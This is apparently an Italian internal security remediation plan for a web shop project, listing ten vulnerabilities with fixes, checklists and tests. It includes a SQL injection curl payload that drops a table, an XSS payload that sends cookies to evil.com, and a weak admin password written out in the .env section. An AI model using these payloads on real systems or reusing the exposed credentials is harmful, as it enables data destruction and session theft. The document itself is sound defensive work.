# 🚨 Security TODO - Vulnerabilità e Fix Prioritizzati

**Data Creazione**: 14 Ottobre 2025  
**Autore**: Andrea  
**Branch**: `01-layer-security`  
**Status**: 🔴 CRITICO - Azione Immediata Richiesta

---

## 📊 Panoramica

| Categoria  | Items  | Completati | Urgenti | Status |
| ---------- | ------ | ---------- | ------- | ------ |
| 🔴 CRITICI | 2      | 0          | 2       | ❌     |
| 🟠 ALTI    | 3      | 0          | 3       | ❌     |
| 🟡 MEDI    | 3      | 0          | 0       | ⏸️     |
| 🟢 BASSI   | 2      | 0          | 0       | ⏸️     |
| **TOTALE** | **10** | **0**      | **5**   | **0%** |

**Security Score Attuale**: 68/100 ⚠️  
**Security Score Target**: 90/100 🎯

---

## 🔴 CRITICI - Fix Immediato (Oggi)

### 1. ⚠️ SQL INJECTION in agent.controller.ts

**Priorità**: 🔥🔥🔥🔥🔥 CRITICO  
**Rischio**: Database compromise, data exfiltration  
**File**: `backend/src/interfaces/http/controllers/agent.controller.ts:35`  
**Status**: ❌ NON RISOLTO

#### Vulnerabilità

```typescript
// ❌ VULNERABILE A SQL INJECTION
const sqlQuery = `SELECT "id" FROM "Workspace" WHERE "id" = '${workspaceId}' LIMIT 1;`
```

**Exploit Possibile**:

```bash
# Attacker può iniettare SQL tramite header/param
curl -H "x-workspace-id: '; DROP TABLE Workspace; --" \
  http://localhost:3001/api/agent/config

# Oppure
curl http://localhost:3001/api/agent/' OR '1'='1/config
```

#### Fix Richiesto

```typescript
// ✅ SOLUZIONE: Usa Prisma ORM (già disponibile)
const workspace = await prisma.workspace.findUnique({
  where: { id: workspaceId },
  select: { id: true },
})

if (!workspace) {
  return res.status(404).json({ error: "Workspace not found" })
}

// Rimuovi completamente la variabile sqlQuery
```

#### Checklist

- [ ] Rimuovere `sqlQuery` raw SQL string da `agent.controller.ts`
- [ ] Sostituire con query Prisma parametrizzata
- [ ] Verificare tutti i controller per altre SQL raw queries
- [ ] Test: tentare SQL injection con payload malicious
- [ ] Aggiornare test di sicurezza con SQL injection test

#### Test di Verifica

```bash
# Dopo il fix, questo NON deve causare errori SQL
curl -H "x-workspace-id: '; DROP TABLE Workspace; --" \
  http://localhost:3001/api/agent/config

# Deve rispondere: 404 Workspace not found
```

---

### 2. ⚠️ XSS (Cross-Site Scripting) in MessageRenderer.tsx

**Priorità**: 🔥🔥🔥🔥 CRITICO  
**Rischio**: Session hijacking, credential theft, malicious redirects  
**File**: `frontend/src/components/shared/MessageRenderer.tsx:57`  
**Status**: ❌ NON RISOLTO

#### Vulnerabilità

```tsx
// ❌ VULNERABILE A XSS
const formatted = part
  .replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>")
  .replace(/\*(.*?)\*/g, "<em>$1</em>")
// ... altre sostituzioni

return <span dangerouslySetInnerHTML={{ __html: formatted }} />
```

**Exploit Possibile**:

```javascript
// Attacker invia messaggio WhatsApp con XSS
"Ciao! **Clicca qui** <img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"

// Oppure
"Prodotto in offerta! <script>window.location='https://phishing.com'</script>"
```

#### Fix Richiesto

**Step 1**: Installa DOMPurify

```bash
cd frontend
npm install dompurify
npm install --save-dev @types/dompurify
```

**Step 2**: Implementa sanitizzazione

```tsx
import DOMPurify from "dompurify"

// ✅ SOLUZIONE: Sanitizza HTML
const formatted = DOMPurify.sanitize(
  part
    .replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>")
    .replace(/\*(.*?)\*/g, "<em>$1</em>")
    .replace(/~~(.*?)~~/g, "<s>$1</s>")
    .replace(/~(.*?)~/g, "<s>$1</s>")
    .replace(/→\s*(€[\d.,]+)/g, "→ <strong>$1</strong>"),
  {
    ALLOWED_TAGS: ["strong", "em", "s", "br"],
    ALLOWED_ATTR: [],
    KEEP_CONTENT: true,
  }
)

return <span dangerouslySetInnerHTML={{ __html: formatted }} />
```

#### Checklist

- [ ] Installare DOMPurify e types
- [ ] Importare DOMPurify in MessageRenderer.tsx
- [ ] Configurare whitelist tag HTML (strong, em, s, br)
- [ ] Rimuovere TUTTI gli attributi HTML (ALLOWED_ATTR: [])
- [ ] Test: inviare messaggi con `<script>`, `<img onerror>`, `onclick=`
- [ ] Verificare che markdown normale funzioni ancora
- [ ] Aggiornare test frontend con XSS payload

#### Test di Verifica

```typescript
// Test da aggiungere in MessageRenderer.spec.tsx
describe("XSS Protection", () => {
  it("should sanitize script tags", () => {
    const malicious = "Test <script>alert('XSS')</script>"
    const rendered = render(<MessageRenderer message={malicious} />)

    // Non deve contenere <script>
    expect(rendered.container.innerHTML).not.toContain("<script>")
    expect(rendered.container.textContent).toContain("Test")
  })

  it("should sanitize event handlers", () => {
    const malicious = "Click <img src=x onerror='alert(1)'>"
    const rendered = render(<MessageRenderer message={malicious} />)

    // Non deve contenere onerror
    expect(rendered.container.innerHTML).not.toContain("onerror")
  })
})
```

---

## 🟠 ALTI - Fix Urgente (Questa Settimana)

### 3. 🔑 Chiavi Deboli/Default in .env

**Priorità**: 🔥🔥🔥 ALTO  
**Rischio**: JWT forgery, account takeover, data decryption  
**File**: `backend/.env`  
**Status**: ❌ NON RISOLTO

#### Vulnerabilità

```bash
# ❌ CHIAVI DEBOLI/DEFAULT
JWT_SECRET="your-super-secret-jwt-key-change-in-production"
TOKEN_ENCRYPTION_KEY="default-key-change-in-production"
ADMIN_PASSWORD="venezia44"  # Solo 9 caratteri, no simboli
```

**Rischio**:

- JWT_SECRET debole → Attacker può forgiare token admin
- TOKEN_ENCRYPTION_KEY default → Decrypt link clienti
- ADMIN_PASSWORD corto → Brute force in 2-3 ore

#### Fix Richiesto

```bash
# Step 1: Backup .env
cd backend
cp .env .env.backup.$(date +%Y%m%d_%H%M%S)

# Step 2: Genera nuove chiavi crittograficamente sicure
JWT_SECRET=$(node -e "console.log(require('crypto').randomBytes(64).toString('hex'))")
TOKEN_ENCRYPTION_KEY=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
ADMIN_PASSWORD=$(openssl rand -base64 24)  # 32+ caratteri random

# Step 3: Aggiorna .env
echo "JWT_SECRET=$JWT_SECRET" > .env.new
echo "TOKEN_ENCRYPTION_KEY=$TOKEN_ENCRYPTION_KEY" >> .env.new
echo "ADMIN_PASSWORD=$ADMIN_PASSWORD" >> .env.new

# Step 4: Merge manualmente con .env esistente
# ATTENZIONE: Questo invaliderà tutti i token esistenti!

# Step 5: Riavvia server
npm run dev
```

#### Checklist

- [ ] Backup attuale `.env` con timestamp
- [ ] Generare `JWT_SECRET` (512 bit = 128 hex chars)
- [ ] Generare `TOKEN_ENCRYPTION_KEY` (256 bit = 64 hex chars)
- [ ] Generare `ADMIN_PASSWORD` (24+ caratteri random base64)
- [ ] Aggiornare `.env` con nuove chiavi
- [ ] Aggiornare `.env.example` con istruzioni generazione
- [ ] Testare login admin con nuova password
- [ ] Aggiornare password manager/1Password con nuove credenziali
- [ ] Documentare procedura rotazione chiavi (ogni 90 giorni)
- [ ] Invalidare tutti i JWT token esistenti (logout forzato)

#### Impatto

⚠️ **BREAKING CHANGE**:

- Tutti gli admin dovranno rifare login (JWT invalidi)
- Tutti i link clienti esistenti saranno invalidi (SecureToken cifrati con vecchia chiave)
- Considerare migrazione graduale o notifica preventiva

#### Post-Fix

```bash
# Verifica lunghezza chiavi
grep JWT_SECRET backend/.env | wc -c  # Deve essere ~140 caratteri
grep TOKEN_ENCRYPTION_KEY backend/.env | wc -c  # Deve essere ~80 caratteri
grep ADMIN_PASSWORD backend/.env | wc -c  # Deve essere ~35+ caratteri
```

---

### 4. 🔒 HTTPS Non Configurato (Production)

**Priorità**: 🔥🔥🔥 ALTO  
**Rischio**: MITM attacks, credential interception, session hijacking  
**Status**: ❌ NON RISOLTO

#### Vulnerabilità

- Traffico HTTP in chiaro (no SSL/TLS)
- Cookie `auth_token` senza flag `secure`
- Possibile downgrade attack

**Rischio**:

```bash
# Attacker su stessa rete Wi-Fi può intercettare:
# - JWT Token admin
# - Password login
# - Dati clienti sensibili
```

#### Fix Richiesto

**Per Heroku (Production)**:

```bash
# Heroku gestisce automaticamente HTTPS
# Verifica solo che i cookie usino secure flag
```

**Backend - Cookie Sicuri**:

```typescript
// backend/src/interfaces/http/controllers/auth.controller.ts
res.cookie("auth_token", jwtToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === "production", // ← HTTPS only in prod
  sameSite: "strict",
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 giorni
  domain: process.env.COOKIE_DOMAIN || undefined,
})
```

**Frontend - Verifica HTTPS**:

```typescript
// frontend/src/utils/security.ts
export function enforceHTTPS() {
  if (
    process.env.NODE_ENV === "production" &&
    window.location.protocol !== "https:"
  ) {
    window.location.href = window.location.href.replace("http:", "https:")
  }
}

// frontend/src/main.tsx
enforceHTTPS()
```

#### Checklist

- [ ] Verificare Heroku auto-SSL (dovrebbe essere già attivo)
- [ ] Aggiungere flag `secure: true` a tutti i cookie in production
- [ ] Implementare redirect automatico HTTP → HTTPS in frontend
- [ ] Configurare `COOKIE_DOMAIN` in .env per production
- [ ] Test: verificare che cookie non vengano inviati su HTTP
- [ ] Configurare HSTS header (HTTP Strict Transport Security)
- [ ] Test con SSL Labs (https://www.ssllabs.com/ssltest/)

#### HSTS Configuration

```typescript
// backend/src/server.ts
app.use((req, res, next) => {
  if (process.env.NODE_ENV === "production") {
    res.setHeader(
      "Strict-Transport-Security",
      "max-age=31536000; includeSubDomains; preload"
    )
  }
  next()
})
```

---

### 5. 🚦 Rate Limiting Incompleto

**Priorità**: 🔥🔥 ALTO  
**Rischio**: DoS attacks, brute force, API abuse  
**Status**: ⚠️ PARZIALE (solo /auth/login)

#### Vulnerabilità

**Protetto**:

- ✅ `/auth/login` - Max 5 tentativi/15min

**NON Protetto** (vulnerabile):

- ❌ `/api/whatsapp/webhook` - Può essere spammato
- ❌ `/api/workspaces/:id/orders-public` - Token brute force
- ❌ `/api/checkout` - DoS attack
- ❌ `/api/cart/*` - Cart manipulation spam
- ❌ `/api/registration` - Account creation spam

#### Fix Richiesto

**Step 1**: Configurare rate limiters per endpoint pubblici

```typescript
// backend/src/config/rate-limiters.ts
import rateLimit from "express-rate-limit"

// Webhook WhatsApp - Protezione DoS
export const webhookLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minuto
  max: 10, // 10 richieste per IP
  message: "Too many webhook requests, please try again later",
  standardHeaders: true,
  legacyHeaders: false,
})

// Public Orders - Protezione brute force token
export const publicOrdersLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minuti
  max: 30, // 30 richieste per IP (2 al minuto)
  message: "Too many order requests, please try again later",
})

// Checkout - Protezione spam ordini
export const checkoutLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 ora
  max: 20, // 20 ordini per IP all'ora
  message: "Too many checkout attempts, please try again later",
})

// Registration - Protezione account creation spam
export const registrationLimiter = rateLimit({
  windowMs: 60 * 60 * 1000, // 1 ora
  max: 5, // 5 registrazioni per IP all'ora
  message: "Too many registration attempts, please try again later",
})

// Cart operations - Protezione cart manipulation
export const cartLimiter = rateLimit({
  windowMs: 60 * 1000, // 1 minuto
  max: 30, // 30 operazioni al minuto
  message: "Too many cart operations, please slow down",
})
```

**Step 2**: Applicare ai routes

```typescript
// backend/src/interfaces/http/routes/whatsapp.routes.ts
import { webhookLimiter } from "../../config/rate-limiters"

router.post("/webhook", webhookLimiter, controller.handleMessage)

// backend/src/interfaces/http/routes/orders.routes.ts
import { publicOrdersLimiter } from "../../config/rate-limiters"

router.get("/orders-public", publicOrdersLimiter, controller.getPublicOrders)

// backend/src/interfaces/http/routes/checkout.routes.ts
import { checkoutLimiter } from "../../config/rate-limiters"

router.post(
  "/checkout",
  checkoutLimiter,
  authMiddleware,
  controller.createOrder
)

// backend/src/interfaces/http/routes/registration.routes.ts
import { registrationLimiter } from "../../config/rate-limiters"

router.post("/register", registrationLimiter, controller.register)

// backend/src/interfaces/http/routes/cart.routes.ts
import { cartLimiter } from "../../config/rate-limiters"

router.use(cartLimiter) // Applica a tutte le cart routes
```

#### Checklist

- [ ] Creare file `backend/src/config/rate-limiters.ts`
- [ ] Configurare `webhookLimiter` (10 req/min)
- [ ] Configurare `publicOrdersLimiter` (30 req/15min)
- [ ] Configurare `checkoutLimiter` (20 req/hour)
- [ ] Configurare `registrationLimiter` (5 req/hour)
- [ ] Configurare `cartLimiter` (30 req/min)
- [ ] Applicare limiters ai routes corretti
- [ ] Test: bombardare endpoint e verificare 429 Too Many Requests
- [ ] Monitorare logs per rate limit hits
- [ ] Documentare limiti in API docs/Swagger

#### Test di Verifica

```bash
# Test webhook rate limit
for i in {1..15}; do
  curl -X POST http://localhost:3001/api/whatsapp/webhook \
    -H "Content-Type: application/json" \
    -d '{"test": true}'
done
# Dopo 10 richieste deve rispondere: 429 Too Many Requests

# Test public orders rate limit
for i in {1..35}; do
  curl http://localhost:3001/api/workspaces/test/orders-public?token=abc
done
# Dopo 30 richieste deve rispondere: 429
```

---

## 🟡 MEDI - Fix Importante (Prossime 2 Settimane)

### 6. 👤 Mancanza 2FA per Admin

**Priorità**: 🔥🔥 MEDIO  
**Rischio**: Account takeover, credential stuffing  
**Status**: ❌ NON IMPLEMENTATO

#### Vulnerabilità

Admin login dipende solo da email + password:

- Nessun secondo fattore
- Vulnerabile a credential leak
- Nessuna notifica login sospetti

#### Fix Richiesto

Implementare 2FA con Google Authenticator (TOTP):

**Backend**:

```bash
npm install speakeasy qrcode
```

```typescript
// backend/src/services/two-factor-auth.service.ts
import speakeasy from "speakeasy"
import qrcode from "qrcode"

export class TwoFactorAuthService {
  async generateSecret(userId: string, email: string) {
    const secret = speakeasy.generateSecret({
      name: `ShopME (${email})`,
      length: 32,
    })

    // Salva secret.base32 nel database (encrypted!)
    await prisma.user.update({
      where: { id: userId },
      data: { twoFactorSecret: this.encrypt(secret.base32) },
    })

    // Genera QR code
    const qrCodeUrl = await qrcode.toDataURL(secret.otpauth_url!)

    return { secret: secret.base32, qrCode: qrCodeUrl }
  }

  async verifyToken(userId: string, token: string): Promise<boolean> {
    const user = await prisma.user.findUnique({ where: { id: userId } })
    const secret = this.decrypt(user.twoFactorSecret)

    return speakeasy.totp.verify({
      secret,
      encoding: "base32",
      token,
      window: 2, // Tolleranza ±60 secondi
    })
  }
}
```

**Frontend - Setup 2FA**:

```tsx
// frontend/src/pages/Settings2FAPage.tsx
<div className="2fa-setup">
  <h2>Enable Two-Factor Authentication</h2>

  <ol>
    <li>Install Google Authenticator app</li>
    <li>Scan this QR code:</li>
  </ol>

  <img src={qrCodeUrl} alt="2FA QR Code" />

  <p>
    Or enter manually: <code>{secret}</code>
  </p>

  <input
    type="text"
    placeholder="Enter 6-digit code"
    value={verificationCode}
    onChange={(e) => setVerificationCode(e.target.value)}
  />

  <button onClick={verify2FA}>Verify & Enable</button>
</div>
```

**Frontend - Login con 2FA**:

```tsx
// frontend/src/pages/LoginPage.tsx
{
  user2FAEnabled && (
    <input
      type="text"
      placeholder="2FA Code"
      value={twoFactorCode}
      onChange={(e) => setTwoFactorCode(e.target.value)}
      maxLength={6}
    />
  )
}
```

#### Checklist

- [ ] Installare `speakeasy` e `qrcode` packages
- [ ] Aggiungere campo `twoFactorSecret` al model User (encrypted)
- [ ] Aggiungere campo `twoFactorEnabled` booleano
- [ ] Creare `TwoFactorAuthService` con encrypt/decrypt
- [ ] Endpoint POST `/api/auth/2fa/setup` per generare QR
- [ ] Endpoint POST `/api/auth/2fa/verify` per attivare
- [ ] Endpoint POST `/api/auth/2fa/disable` per disattivare
- [ ] Modificare login flow per richiedere 2FA code se enabled
- [ ] Frontend: pagina Settings con QR code generator
- [ ] Frontend: input 2FA code in LoginPage
- [ ] Test: setup, login, disable 2FA
- [ ] Backup codes per recovery (10 codici usa-e-getta)
- [ ] Documentazione utente su come configurare

#### Note

⚠️ **IMPORTANTE**:

- Secret 2FA deve essere cifrato in database (usa AES-256-CBC)
- Generare backup codes per recovery (se perde telefono)
- Rate limit su verify 2FA (max 5 tentativi)

---

### 7. 📝 Logging Eccessivo Dati Sensibili

**Priorità**: 🔥🔥 MEDIO  
**Rischio**: Information disclosure, compliance violation (GDPR)  
**Status**: ❌ NON RISOLTO

#### Vulnerabilità

Logger espone dati sensibili in produzione:

```typescript
// ❌ RISCHIO: Log completi di token/password
logger.info(`JWT Token: ${jwtToken}`)
logger.info(`Customer data:`, customer) // Include email, phone
logger.info(`API Key: ${process.env.OPENROUTER_API_KEY}`)
logger.debug(`Cart:`, cart) // Include tutti i dettagli ordine
```

**Rischio**:

- Log files potrebbero essere letti da attacker
- Violazione GDPR (log PII senza consenso)
- Credential leak se log vengono esposti

#### Fix Richiesto

**Step 1**: Creare utility per redact sensitive data

```typescript
// backend/src/utils/logger-redactor.ts
export class LogRedactor {
  private static sensitiveFields = [
    "password",
    "token",
    "secret",
    "apiKey",
    "authorization",
    "cookie",
    "sessionId",
  ]

  static redact(data: any): any {
    if (typeof data === "string") {
      // Redact JWT tokens
      return data.replace(
        /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g,
        "[REDACTED_JWT]"
      )
    }

    if (typeof data === "object" && data !== null) {
      const redacted = { ...data }

      for (const key in redacted) {
        const lowerKey = key.toLowerCase()

        // Redact sensitive fields
        if (this.sensitiveFields.some((field) => lowerKey.includes(field))) {
          if (typeof redacted[key] === "string" && redacted[key].length > 0) {
            redacted[key] = `[REDACTED_${redacted[key].substring(0, 4)}...]`
          } else {
            redacted[key] = "[REDACTED]"
          }
        }

        // Redact email parzialmente
        if (key === "email" && typeof redacted[key] === "string") {
          const [user, domain] = redacted[key].split("@")
          redacted[key] = `${user.substring(0, 2)}***@${domain}`
        }

        // Redact phone parzialmente
        if (key === "phone" && typeof redacted[key] === "string") {
          redacted[key] = `***${redacted[key].slice(-4)}`
        }

        // Recursivo per oggetti nested
        if (typeof redacted[key] === "object") {
          redacted[key] = this.redact(redacted[key])
        }
      }

      return redacted
    }

    return data
  }
}
```

**Step 2**: Wrappare logger

```typescript
// backend/src/utils/logger.ts
import winston from "winston"
import { LogRedactor } from "./logger-redactor"

const logger = winston.createLogger({
  // ... configurazione esistente
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.printf(({ level, message, timestamp, ...meta }) => {
      // Redact automaticamente tutti i meta
      const redactedMeta = LogRedactor.redact(meta)
      const redactedMessage = LogRedactor.redact(message)

      return `${timestamp} [${level}]: ${redactedMessage} ${JSON.stringify(
        redactedMeta
      )}`
    })
  ),
})

// Export wrapped logger
export default {
  info: (message: string, ...meta: any[]) => {
    logger.info(message, ...meta.map((m) => LogRedactor.redact(m)))
  },

  error: (message: string, ...meta: any[]) => {
    logger.error(message, ...meta.map((m) => LogRedactor.redact(m)))
  },

  // ... altri metodi
}
```

**Step 3**: Aggiornare logger calls

```typescript
// ✅ CORRETTO: Redact sensibile data
logger.info(`Token generated for user`, {
  userId,
  tokenPreview: token?.substring(0, 10),
})
logger.info(`API Key present: ${!!process.env.OPENROUTER_API_KEY}`)
logger.info(`Customer registered`, {
  customerId: customer.id,
  email: LogRedactor.redact(customer.email),
})
```

#### Checklist

- [ ] Creare `logger-redactor.ts` utility
- [ ] Lista completa sensitive fields (password, token, secret, etc)
- [ ] Implementare redact per strings (JWT pattern matching)
- [ ] Implementare redact per objects (recursive)
- [ ] Redact parziale email (mo\*\*\*@example.com)
- [ ] Redact parziale phone (\*\*\*1234)
- [ ] Wrappare logger con auto-redact
- [ ] Audit tutti i logger.\* calls nel codebase
- [ ] Aggiornare logger calls che loggano PII
- [ ] Test: verificare log files non contengono dati sensibili
- [ ] Documentare logging best practices

#### Test di Verifica

```typescript
// Test logger-redactor
describe("LogRedactor", () => {
  it("should redact JWT tokens", () => {
    const data =
      "Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMifQ.abc123"
    expect(LogRedactor.redact(data)).toBe("Token: [REDACTED_JWT]")
  })

  it("should redact email partially", () => {
    expect(LogRedactor.redact({ email: "mario.rossi@gmail.com" })).toEqual({
      email: "ma***@gmail.com",
    })
  })

  it("should redact sensitive fields", () => {
    expect(LogRedactor.redact({ password: "secret123", token: "abc" })).toEqual(
      { password: "[REDACTED_secr...]", token: "[REDACTED_abc...]" }
    )
  })
})
```

---

### 8. 🔐 SecureToken Senza HMAC Signature

**Priorità**: 🔥 MEDIO  
**Rischio**: Replay attacks, token tampering  
**File**: `backend/src/application/services/secure-token.service.ts`  
**Status**: ❌ NON IMPLEMENTATO

#### Vulnerabilità

SecureToken attuale usa solo AES-256-CBC:

- Nessuna firma HMAC per verificare integrità
- Possibili replay attacks
- Token potrebbe essere modificato (se IV/key leaked)

**Documentato in**: `docs/memory-bank/06-SECURITY/authentication-tokens.md:337`

#### Fix Richiesto

Aggiungere HMAC signature al token:

```typescript
// backend/src/application/services/secure-token.service.ts
import crypto from 'crypto'

export class SecureTokenService {
  private encryptionKey: string
  private hmacKey: string  // ← NUOVO

  constructor() {
    this.encryptionKey = process.env.TOKEN_ENCRYPTION_KEY || "..."
    this.hmacKey = process.env.TOKEN_HMAC_KEY || "..."  // ← NUOVO in .env
  }

  async createToken(...): Promise<string> {
    // 1. Cifra payload (come prima)
    const encrypted = this.encrypt(JSON.stringify(payload))

    // 2. ✅ NUOVO: Genera HMAC signature
    const hmac = crypto.createHmac('sha256', this.hmacKey)
      .update(encrypted)
      .digest('hex')

    // 3. Token finale: encrypted.hmac
    const finalToken = `${encrypted}.${hmac}`

    // 4. Salva in database
    await prisma.secureToken.create({
      data: {
        token: finalToken,
        hmacSignature: hmac,  // ← NUOVO campo
        // ... resto
      }
    })

    return finalToken
  }

  async validateToken(token: string): Promise<ValidationResult> {
    // 1. Split token
    const [encrypted, providedHmac] = token.split('.')

    if (!providedHmac) {
      return { valid: false, error: 'Invalid token format' }
    }

    // 2. ✅ NUOVO: Verifica HMAC signature
    const expectedHmac = crypto.createHmac('sha256', this.hmacKey)
      .update(encrypted)
      .digest('hex')

    if (providedHmac !== expectedHmac) {
      logger.warn('Token HMAC signature mismatch - possible tampering')
      return { valid: false, error: 'Invalid signature' }
    }

    // 3. Verifica in database
    const dbToken = await prisma.secureToken.findFirst({
      where: {
        token,
        hmacSignature: providedHmac  // ← NUOVO check
      }
    })

    if (!dbToken) {
      return { valid: false, error: 'Token not found' }
    }

    // 4. Resto validazione (expiry, isActive, etc)
    // ...
  }
}
```

#### Checklist

- [ ] Generare `TOKEN_HMAC_KEY` (256 bit) e aggiungerlo a `.env`
- [ ] Aggiungere campo `hmacSignature` al model `SecureToken`
- [ ] Creare migration Prisma per nuovo campo
- [ ] Modificare `createToken()` per generare HMAC
- [ ] Modificare `validateToken()` per verificare HMAC
- [ ] Aggiornare formato token: `encrypted.hmac` (separato da punto)
- [ ] Gestire backward compatibility (token vecchi senza HMAC)
- [ ] Test: tentare modificare token cifrato e verificare reject
- [ ] Test: replay attack con stesso token
- [ ] Documentare nuovo formato token

#### Migration Strategy

```typescript
// Backward compatibility per token esistenti
async validateToken(token: string): Promise<ValidationResult> {
  const parts = token.split('.')

  // Token nuovo con HMAC
  if (parts.length === 2) {
    return this.validateTokenWithHMAC(parts[0], parts[1])
  }

  // Token vecchio senza HMAC (deprecato ma accettato per grace period)
  if (parts.length === 1) {
    logger.warn('Token without HMAC signature - deprecated format')
    return this.validateLegacyToken(parts[0])
  }

  return { valid: false, error: 'Invalid token format' }
}
```

#### Test di Verifica

```typescript
describe('SecureToken HMAC', () => {
  it('should reject tampered token', async () => {
    const token = await service.createToken('orders', workspaceId, {...}, '1h', customerId)
    const [encrypted, hmac] = token.split('.')

    // Modifica encrypted part
    const tamperedToken = encrypted.slice(0, -1) + 'X.' + hmac

    const result = await service.validateToken(tamperedToken)
    expect(result.valid).toBe(false)
    expect(result.error).toContain('Invalid signature')
  })

  it('should reject replayed token after revocation', async () => {
    const token = await service.createToken('orders', workspaceId, {...}, '1h', customerId)

    // Revoke token
    await service.revokeToken(token)

    // Try replay
    const result = await service.validateToken(token)
    expect(result.valid).toBe(false)
  })
})
```

---

## 🟢 BASSI - Miglioramenti (Quando Possibile)

### 9. 📜 Implementare Content Security Policy (CSP)

**Priorità**: 🔹 BASSO  
**Rischio**: XSS mitigation extra layer  
**Status**: ❌ NON IMPLEMENTATO

#### Fix Richiesto

```typescript
// backend/src/server.ts
import helmet from "helmet"

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'unsafe-inline'"], // Rimuovere unsafe-inline se possibile
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.openrouter.ai"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: [],
    },
  })
)
```

#### Checklist

- [ ] Installare `helmet` package
- [ ] Configurare CSP directives
- [ ] Test: verificare che app funzioni con CSP
- [ ] Rimuovere `unsafe-inline` se possibile (webpack nonce)
- [ ] Monitorare CSP violations con report-uri

---

### 10. 🔄 Implementare Token Refresh Mechanism

**Priorità**: 🔹 BASSO  
**Rischio**: Long-lived JWT tokens  
**Status**: ❌ NON IMPLEMENTATO

#### Fix Richiesto

Implementare refresh token per rinnovare JWT senza re-login:

```typescript
// Quando JWT scade, usa refresh token per ottenerne uno nuovo
// Refresh token: long-lived (30 giorni), revocabile, stored in DB
```

#### Checklist

- [ ] Creare model `RefreshToken` in Prisma
- [ ] Endpoint POST `/api/auth/refresh` per rinnovare JWT
- [ ] Frontend: intercettare 401, tentare refresh automatico
- [ ] Revoke refresh token su logout
- [ ] Test: refresh mechanism flow completo

---

## 📊 Metriche di Progresso

### Per Priorità

```
🔴 CRITICI (2):     ████░░░░░░  0/2 (0%)
🟠 ALTI (3):        ████░░░░░░  0/3 (0%)
🟡 MEDI (3):        ████░░░░░░  0/3 (0%)
🟢 BASSI (2):       ████░░░░░░  0/2 (0%)
```

### Timeline Stimato

| Fase              | Durata           | Deadline    | Status |
| ----------------- | ---------------- | ----------- | ------ |
| Fix CRITICI (1-2) | 2-3 ore          | **Oggi**    | ⏰     |
| Fix ALTI (3-5)    | 1 settimana      | 21 Ott 2025 | ⏸️     |
| Fix MEDI (6-8)    | 2 settimane      | 28 Ott 2025 | ⏸️     |
| Fix BASSI (9-10)  | Quando possibile | TBD         | ⏸️     |

---

## ✅ Checklist Generale

### Pre-Fix

- [ ] Backup completo database
- [ ] Backup `.env` con timestamp
- [ ] Branch git dedicato: `security-fixes`
- [ ] Notifica team di manutenzione programmata

### Durante Fix

- [ ] Un fix alla volta (no bulk changes)
- [ ] Test dopo ogni fix
- [ ] Commit separati per ogni vulnerabilità
- [ ] Documentare breaking changes

### Post-Fix

- [ ] Run full security test suite
- [ ] Test manuale su staging
- [ ] Aggiornare security score
- [ ] Aggiornare questo documento (mark as completed)
- [ ] Merge su main branch

---

## 🔗 Riferimenti

- **Security Assessment**: `docs/memory-bank/06-SECURITY/security-assessment.md`
- **Authentication Tokens**: `docs/memory-bank/06-SECURITY/authentication-tokens.md`
- **OWASP Compliance**: `docs/memory-bank/06-SECURITY/owasp-compliance.md`
- **Rate Limiting Tests**: `docs/memory-bank/06-SECURITY/rate-limiting-tests.md`

---

**Ultima Modifica**: 14 Ottobre 2025  
**Prossimo Review**: Dopo ogni fix completato  
**Owner**: Andrea

---

## 📝 Note

⚠️ **IMPORTANTE**:

- Testare SEMPRE su staging prima di production
- Backup database prima di ogni deploy
- Comunicare breaking changes al team
- Invalidare sessioni/token dopo cambio chiavi

🎯 **Goal**: Security Score 90/100 entro fine Ottobre 2025

---

**END OF DOCUMENT**
